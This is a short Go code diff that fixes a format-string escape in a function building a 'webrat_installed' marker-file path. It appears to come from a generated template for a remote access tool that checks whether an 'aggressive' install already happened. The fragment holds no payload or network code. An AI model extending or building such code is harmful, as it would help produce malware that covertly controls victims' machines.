@@ -13,7 +13,7 @@ func getAggressiveMarkerPath() string {
 	if "%s" == "" {
 		return filepath.Join(dir, "webrat_installed.flag")
 	}
-	return filepath.Join(dir, fmt.Sprintf("webrat_installed_%s.flag", "%s"))
+	return filepath.Join(dir, fmt.Sprintf("webrat_installed_%%s.flag", "%s"))
 }
 
 func isAggressiveAlreadyInstalled() bool {
